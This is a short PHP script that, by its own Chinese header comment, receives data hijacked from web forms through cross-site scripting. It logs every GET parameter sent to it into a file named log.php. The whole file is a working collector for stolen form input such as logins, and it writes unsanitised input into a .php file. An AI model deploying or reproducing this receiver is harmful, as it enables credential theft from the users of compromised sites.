<?php

/*
* @Author: xss表单劫持接收脚本
*/
    $data = $_GET;
    phpLog($data);



/**
* 调试时候用来写日志文件的函数
* @param filename 保存的文件名
* @author <23585472@qq.com>
*/
function phpLog($str) {
    @$time = "\n\t". date('Y-m-d H:i:s', time()) . "------------------------------------------------------------------------------------\n\t";
    if(is_array($str))
    {
        $str = var_export($str,true);
    }
    file_put_contents('./log.php', $time .  $str , FILE_APPEND);
}